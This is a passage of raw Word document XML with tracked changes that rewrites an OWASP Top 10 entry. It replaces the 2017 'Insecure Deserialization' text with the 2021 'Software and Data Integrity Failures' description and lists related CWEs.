            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>software updates, critical data, and CI/CD pipelines without verifying</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4354A54D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2870" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2871" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">integrity. One of the highest weighted impacts from </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2156660C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2872" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2873" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Common Vulnerability and Exposures/Common Vulnerability Scoring System (CVE/CVSS) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0A95A37E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2874" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2875" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>data. Notable Common Weakness Enumerations (CWEs) include</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="29ADD70A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2876" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2877" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>*CWE-829: Inclusion of Functionality from Untrusted Control Sphere*,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0D1F724D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2878" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2879" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">*CWE-494: Download of Code Without Integrity Check*, and </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0A70BB62" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2880" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>*CWE-502:</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Deserialization</w:t>
      </w:r>
      <w:ins w:id="2881" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> of Untrusted Data*.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="002BCBC0" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2882" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2883" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Threat agents/Attack vectors | Security Weakness           | Impacts               |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2B3447AA" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2884" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2885" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| -- | -- | -- |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0FAE001B" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2886" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2887" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Access Lvl : Exploitability 1 | Prevalence 2 : Detectability 2 | Technical 3 : Business |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2146C847" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2888" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2889" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Exploitation of deserialization is somewhat difficult, as off the shelf exploits rarely work without changes or tweaks to the underlying exploit code. | This issue is included in the Top 10 based on an [industry survey](https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html) and not on quantifiable data. Some tools can discover deserialization flaws, but human assistance is frequently needed to validate the problem. It is expected that prevalence data for deserialization flaws will increase as tooling is developed to help identify and address it. | The impact of deserialization flaws cannot be overstated. These flaws can lead to remote code execution attacks, one of the most serious attacks possible. The business impact depends on the protection needs of the application and data. |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="337E15AC" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2890" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07124513" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2891" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2892" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## Is the Application Vulnerable?</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="62F0985B" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2893" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2894" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Applications and APIs will be vulnerable if they deserialize hostile or tampered objects supplied by an attacker.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4311CC93" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2895" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2896" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>This can result in two primary types of attacks:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1CE2045D" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2897" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2898" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Object and data structure related attacks where the attacker modifies application logic or achieves arbitrary remote code execution if there are classes available to the application that can change behavior during or after deserialization.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="25CE18E9" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2899" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2900" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:delText>* Typical data tampering attacks such as access-control-related attacks where existing data structures are used but the content is changed.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="21D1560D" w14:textId="6E9E742A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2901" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2902" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Serialization may be used in</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="76DEF415" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2903" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2904" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Description</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6246AEC8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2905" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CAC10E3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2906" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2907" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Software and data integrity failures relate to code and infrastructure</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0010B354" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2908" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2909" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1BBC4F58" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2910" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2911" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>delivery networks (CDNs). An insecure CI/CD pipeline can introduce the</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="223CB4CB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2912" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2913" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>potential for unauthorized access, malicious code, or system compromise.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0DF09E59" w14:textId="4FDB6113" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2914" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Lastly, many</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> applications </w:t>
      </w:r>
      <w:del w:id="2915" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>for:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2916" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">now include auto-update functionality, </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>where</w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2E27EC72" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2917" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2918" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">* Remote- and inter-process communication (RPC/IPC) </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4CA6A363" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2919" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2920" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Wire protocols, web services, message brokers</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2FD6DBDE" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2921" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2922" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* Caching/Persistence</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="60BD9163" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2923" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2924" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">* Databases, cache servers, file systems </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="637F7694" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2925" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2926" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">* HTTP cookies, HTML form parameters, API authentication tokens </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2BF4F005" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2927" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62F78490" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2928" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2929" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>updates are downloaded without sufficient integrity verification and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4CA5660C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2930" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2931" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>applied to the previously trusted application. Attackers could</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0048BD1E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2932" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
